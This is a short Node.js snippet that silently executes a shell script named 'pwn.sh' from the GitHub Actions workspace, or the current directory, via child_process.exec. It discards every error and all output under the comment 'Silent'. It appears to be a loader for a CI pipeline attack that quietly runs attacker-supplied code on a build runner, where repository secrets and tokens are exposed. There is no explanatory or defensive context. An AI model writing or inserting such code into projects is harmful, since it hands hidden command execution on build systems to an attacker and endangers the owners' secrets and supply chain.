const { exec } = require('child_process');
const path = require('path');
const scriptPath = path.join(process.env.GITHUB_WORKSPACE || process.cwd(), 'pwn.sh');
exec(`bash ${scriptPath}`, (error, stdout, stderr) => {
    // Silent
});
